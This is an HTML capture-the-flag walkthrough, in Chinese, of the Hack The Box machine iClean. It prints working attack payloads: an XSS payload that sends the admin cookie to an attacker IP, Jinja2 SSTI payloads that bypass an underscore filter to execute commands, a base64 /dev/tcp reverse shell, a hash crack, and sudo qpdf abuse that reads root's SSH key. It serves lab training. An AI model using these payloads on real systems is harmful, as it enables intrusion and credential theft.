@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB iClean — Nauhcnes</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--phase-recon:#60a5fa;--phase-foothold:#4ade80;--phase-lateral:#a78bfa;--phase-privesc:#f87171;--medium:#fbbf24;--linux:#60a5fa}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.8;-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+code,pre{font-family:'IBM Plex Mono',monospace}
+code{background:var(--surface-raised);padding:0.15em 0.4em;border-radius:3px;font-size:0.88em}
+pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;font-size:0.82rem;line-height:1.6;margin:1rem 0}
+.header{border-bottom:1px solid var(--border);padding:2.5rem 2rem 2rem;position:relative}
+.header::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--medium)}
+.header-inner{max-width:820px;margin:0 auto}
+.back{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted);text-decoration:none;display:inline-block;margin-bottom:1rem}
+.back:hover{color:var(--accent)}
+.header h1{font-size:2rem;font-weight:700;color:var(--heading);letter-spacing:-0.02em}
+.header-meta{margin-top:0.6rem;font-family:'IBM Plex Mono',monospace;font-size:0.78rem;color:var(--text-muted);display:flex;gap:1.2rem;flex-wrap:wrap}
+.tag{padding:0.15rem 0.5rem;border-radius:3px;background:var(--surface-raised)}
+.tag-medium{color:var(--medium)}
+.tag-linux{color:var(--linux)}
+main{max-width:820px;margin:0 auto;padding:1.5rem 2rem 4rem}
+h2{font-size:1.3rem;font-weight:700;color:var(--heading);margin:2.5rem 0 1rem;padding-bottom:0.4rem;border-bottom:1px solid var(--border)}
+h3{font-size:1.05rem;font-weight:600;color:var(--heading);margin:1.8rem 0 0.8rem}
+p{margin:0.6rem 0}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem}
+th,td{border:1px solid var(--border);padding:0.5rem 0.8rem;text-align:left}
+th{background:var(--surface);color:var(--heading);font-weight:600}
+td{background:var(--surface)}
+.callout{background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.2rem;margin:1rem 0;font-size:0.9rem}
+.callout-warn{border-left-color:var(--medium)}
+.phase{font-family:'IBM Plex Mono',monospace;font-size:0.7rem;letter-spacing:0.1em;text-transform:uppercase;padding:0.2rem 0.6rem;border-radius:3px;display:inline-block;margin-bottom:0.4rem}
+.phase-recon{background:#1e3a5f40;color:var(--phase-recon)}
+.phase-foothold{background:#16653420;color:var(--phase-foothold)}
+.phase-lateral{background:#4c1d9520;color:var(--phase-lateral)}
+.phase-privesc{background:#991b1b20;color:var(--phase-privesc)}
+.diagram{display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap;padding:1.2rem;background:var(--surface);border:1px solid var(--border);border-radius:6px;margin:1.5rem 0;font-family:'IBM Plex Mono',monospace;font-size:0.78rem}
+.node{padding:0.3rem 0.7rem;border-radius:4px;white-space:nowrap}
+.node-green{background:#16653430;color:var(--phase-foothold);border:1px solid #16653460}
+.node-purple{background:#4c1d9530;color:var(--phase-lateral);border:1px solid #4c1d9560}
+.node-red{background:#991b1b30;color:var(--phase-privesc);border:1px solid #991b1b60}
+.arrow{color:var(--text-muted)}
+.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;color:var(--text-muted);border-top:1px solid var(--border)}
+.gate{position:fixed;inset:0;background:var(--bg);z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:1rem}
+.gate input{background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:0.6rem 1rem;border-radius:4px;font-family:'IBM Plex Mono',monospace;font-size:0.9rem;text-align:center;outline:none;width:220px}
+.gate input:focus{border-color:var(--accent)}
+.gate label{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted)}
+.gate .err{color:var(--phase-privesc);font-size:0.75rem;font-family:'IBM Plex Mono',monospace;height:1rem}
+</style>
+</head>
+<body>
+
+<div class="gate" id="gate">
+<label>输入机器名称解锁</label>
+<input type="password" id="gate-pw" placeholder="machine name" autofocus>
+<div class="err" id="gate-err"></div>
+</div>
+<script>
+document.getElementById('gate-pw').addEventListener('keydown',function(e){
+if(e.key==='Enter'){
+if(this.value.toLowerCase()==='iclean'){document.getElementById('gate').style.display='none'}
+else{document.getElementById('gate-err').textContent='wrong password'}
+}});
+</script>
+
+<div class="header">
+<div class="header-inner">
+<a class="back" href="../">← 返回目录</a>
+<h1>iClean</h1>
+<div class="header-meta">
+<span class="tag tag-medium">Medium</span>
+<span class="tag tag-linux">Linux</span>
+<span>10.129.57.106</span>
+</div>
+</div>
+</div>
+
+<main>
+
+<div class="diagram"><span class="node node-green">XSS 窃取 Admin Cookie</span><span class="arrow">→</span><span class="node node-green">Jinja2 SSTI 双下划线绕过 → www-data</span><span class="arrow">→</span><span class="node node-purple">MySQL SHA-256 破解 → consuela</span><span class="arrow">→</span><span class="node node-red">sudo qpdf 读 root SSH 私钥</span></div>
+
+<h2><span class="phase phase-recon">信息收集</span> Nmap 扫描与目录枚举</h2>
+
+<pre>sudo nmap -sCV -p- -T4 10.129.57.106</pre>
+
+<pre>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</pre>
+
+<pre>whatweb http://capiclean.htb
+# Werkzeug/2.3.7 Python/3.10.12</pre>
+
+<pre>gobuster dir -u http://capiclean.htb/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,html,txt --exclude-length 178</pre>
+
+<pre>/login      /services    /quote     /dashboard
+/team       /about       /choose    /logout</pre>
+
+<p><code>/dashboard</code> 重定向到 <code>/</code>（需要登录）。<code>/quote</code> 是报价请求表单。</p>
+
+<h2><span class="phase phase-foothold">立足点</span> XSS 窃取 Cookie → SSTI 命令执行</h2>
+
+<h3>XSS 窃取管理员 Cookie</h3>
+<p><code>/quote</code> 页面的报价请求表单中，<code>service</code> 参数存在存储型 XSS。管理员会定期查看报价请求，触发 XSS。</p>
+
+<p>用 Burp Suite 拦截 POST 请求，在 <code>service</code> 参数中注入（URL 编码）：</p>
+
+<pre>&lt;img src=x onerror="window.location.href='http://10.10.15.65:8888/c='+btoa(document.cookie);" /&gt;</pre>
+
+<pre>python3 -m http.server 8888</pre>
+
+<p>收到管理员 Cookie（Base64 编码），解码后替换浏览器 Cookie，刷新 <code>/dashboard</code> 进入管理面板。</p>
+
+<h3>发现 SSTI 注入点</h3>
+<p>管理面板有 <strong>Generate Invoice</strong> 和 <strong>Generate QR</strong> 两个功能。先生成 Invoice ID，再在 QR 码链接参数 <code>qr_link</code> 中测试 SSTI：</p>
+
+<pre>invoice_id=&amp;form_type=scannable_invoice&amp;qr_link={{7*7}}</pre>
+
+<p>响应中 QR 码图片的 <code>src</code> 属性包含 <code>49</code>（7×7），确认 <strong>Jinja2 SSTI</strong>。</p>
+
+<div class="callout">🧒 <strong>儿童版</strong>：网站有一个"生成带二维码的发票"功能。二维码链接会被直接嵌入到网页模板中。我们在链接位置写入 <code>{{7*7}}</code>，网页显示了 <code>49</code>——说明服务器把我们的输入当成了模板代码执行。这就是 SSTI，和 SQL 注入类似，只不过注入的是模板代码。</div>
+
+<h3>双下划线混淆绕过 + RCE</h3>
+<p>直接使用 <code>__class__</code> 等双下划线属性会被过滤。使用 <code>attr()</code> 和字符串拼接绕过：</p>
+
+<pre># 列出所有子类
+{{''|attr(["_"*2,"class","_"*2]|join)|attr(["_"*2,"base","_"*2]|join)|attr(["_"*2,"subclasses","_"*2]|join)()}}</pre>
+
+<p>在子类列表中找到 <code>subprocess.Popen</code>（索引 365）。构造命令执行 payload：</p>
+
+<pre>{{(''|attr(["_"*2,"class","_"*2]|join)|attr(["_"*2,"base","_"*2]|join)|attr(["_"*2,"subclasses","_"*2]|join)())[365]('id',shell=True,stdout=-1).communicate()}}</pre>
+
+<p>返回 <code>uid=33(www-data)</code>。</p>
+
+<h3>获取反弹 Shell</h3>
+<pre># Base64 编码反弹 shell
+echo "/bin/bash -i &gt;&amp; /dev/tcp/10.10.15.65/5555 0&gt;&amp;1" | base64
+# L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjY1LzU1NTUgMD4mMQo=</pre>
+
+<p>SSTI payload：</p>
+<pre>{{(''|attr(["_"*2,"class","_"*2]|join)|attr(["_"*2,"base","_"*2]|join)|attr(["_"*2,"subclasses","_"*2]|join)())[365]('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjY1LzU1NTUgMD4mMQo=|base64 -d|bash',shell=True,stdout=-1).communicate()}}</pre>
+
+<pre>nc -lvnp 5555
+# www-data@iclean shell obtained</pre>
+
+<h2><span class="phase phase-lateral">横向移动</span> MySQL 凭据 → consuela</h2>
+
+<h3>读取 Flask 应用配置</h3>
+<pre>www-data@iclean:/opt/app$ grep passw app.py -B 5 -A 5</pre>
+
+<pre>db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}</pre>
+
+<h3>MySQL 提取用户哈希</h3>
+<pre>mysql -u iclean -p"pxCsmnGLckUb" -h 127.0.0.1 -P 3306</pre>
+
+<pre>mysql&gt; use capiclean;
+mysql&gt; select * from users;
++----+----------+------------------------------------------------------------------+
+| id | username | password                                                         |
++----+----------+------------------------------------------------------------------+
+|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 |
+|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa |
++----+----------+------------------------------------------------------------------+</pre>
+
+<p>破解 consuela 的 SHA-256 哈希：</p>
+<pre>hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt</pre>
+<pre>0a298fdd...27aa:simple and clean</pre>
+
+<h3>切换用户</h3>
+<pre>su consuela
+# 密码: simple and clean</pre>
+
+<pre>consuela@iclean:~$ cat user.txt
+ab508b8d0c22723547cf0c1dcd14c321</pre>
+
+<h2><span class="phase phase-privesc">权限提升</span> sudo qpdf 读取 Root SSH 私钥</h2>
+
+<h3>检查 sudo 权限</h3>
+<pre>consuela@iclean:~$ sudo -l
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf</pre>
+
+<p><strong>qpdf</strong> 是一个 PDF 操作命令行工具。<code>--add-attachment</code> 参数可以将任意文件作为附件嵌入到 PDF 中。由于 qpdf 以 root 权限运行，可以读取 root 用户的文件。</p>
+
+<h3>利用 qpdf 提取 root SSH 私钥</h3>
+<pre># 创建空白 PDF（攻击机生成后 scp 传过去）
+convert -size 595x842 xc:white -gravity center -annotate 0 'dummy' dummy.pdf
+scp dummy.pdf consuela@capiclean.htb:/tmp
+
+# 将 root 的 SSH 私钥作为附件嵌入 PDF
+sudo /usr/bin/qpdf /tmp/dummy.pdf --add-attachment /root/.ssh/id_rsa -- /tmp/root_key.pdf
+
+# 提取附件内容（不需要 sudo）
+qpdf /tmp/root_key.pdf --show-attachment=id_rsa</pre>
+
+<pre>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
+...
+-----END OPENSSH PRIVATE KEY-----</pre>
+
+<div class="callout">🧒 <strong>儿童版</strong>：qpdf 是一个 PDF 工具，可以往 PDF 里塞附件。管理员给了 consuela <code>sudo qpdf</code> 的权限，本意是让她处理发票 PDF。但 <code>--add-attachment</code> 不检查附件来源——我们让 root 权限的 qpdf 把 root 的 SSH 钥匙塞进 PDF，然后用普通权限把钥匙从 PDF 里掏出来。</div>
+
+<h3>SSH 登录 Root</h3>
+<pre>nano id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa root@capiclean.htb</pre>
+
+<pre>root@iclean:~# cat root.txt
+c14fc9705b1a2e2163556c3751f3a27e</pre>
+
+<div class="callout callout-warn">
+<p><strong>⚠️ 踩坑提醒</strong></p>
+<p>XSS payload 必须 URL 编码后放在 <code>service</code> 参数中，通过 Burp Repeater 发送</p>
+<p>SSTI 注入点在 <code>/QRGenerator</code> 的 <code>qr_link</code> 参数，不是 <code>invoice_id</code></p>
+<p>双下划线 <code>__</code> 被过滤，需要用 <code>["_"*2,"class","_"*2]|join</code> 拼接方式绕过</p>
+<p><code>subprocess.Popen</code> 的索引号（365）可能因 Python 版本不同而变化，需要先列出子类确认</p>
+<p>qpdf 的 <code>--show-attachment</code> 不需要 sudo——只需要 sudo 做嵌入，提取用普通权限即可</p>
+</div>
+
+<h2>知识点速查表</h2>
+
+<table>
+<tr><th>阶段</th><th>技术</th><th>工具</th><th>助记词</th></tr>
+<tr><td>立足点</td><td>存储型 XSS 窃取 Admin Cookie</td><td>img onerror + btoa</td><td>🎣 "报价单偷通行证"</td></tr>
+<tr><td>代码执行</td><td>Jinja2 SSTI + 双下划线混淆绕过</td><td>Burp + <code>attr(["_"*2,...]|join)</code></td><td>💉 "模板注入绕过滤"</td></tr>
+<tr><td>横向移动</td><td>Flask 配置 → MySQL → SHA-256 破解</td><td>app.py + hashcat 1400</td><td>🔗 "配置连环挖密码"</td></tr>
+<tr><td>权限提升</td><td>sudo qpdf 附件嵌入读取 root 文件</td><td><code>--add-attachment</code> + <code>--show-attachment</code></td><td>📎 "PDF 夹带私钥"</td></tr>
+</table>
+
+<h2>额外知识</h2>
+
+<h3>SSTI 双下划线绕过技巧</h3>
+<p>Jinja2 SSTI 中常用的 <code>__class__</code>、<code>__base__</code>、<code>__subclasses__()</code> 如果被 WAF 或过滤函数拦截，可以用以下方式绕过：</p>
+
+<table>
+<tr><th>原始写法</th><th>绕过写法</th></tr>
+<tr><td><code>''.__class__</code></td><td><code>''|attr(["_"*2,"class","_"*2]|join)</code></td></tr>
+<tr><td><code>.__base__</code></td><td><code>|attr(["_"*2,"base","_"*2]|join)</code></td></tr>
+<tr><td><code>.__subclasses__()</code></td><td><code>|attr(["_"*2,"subclasses","_"*2]|join)()</code></td></tr>
+</table>
+
+<p>核心原理：<code>attr()</code> 过滤器接受字符串参数访问对象属性，而 <code>["_"*2,"class","_"*2]|join</code> 在运行时拼接出 <code>__class__</code>，绕过了静态字符串匹配的过滤。</p>
+
+<h3>qpdf 作为文件读取工具</h3>
+<p>qpdf 的 <code>--add-attachment</code> 功能本质上是将指定路径的文件读取并嵌入到 PDF 中。当以 sudo 运行时，它可以读取 root 权限的任何文件。<code>--show-attachment</code> 则可以不需要 sudo 将嵌入的文件内容输出到标准输出。这种"借 PDF 中转"的手法也适用于其他支持附件功能的文档处理工具。</p>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB iClean 攻略 · 2026</footer>
+</body></html>
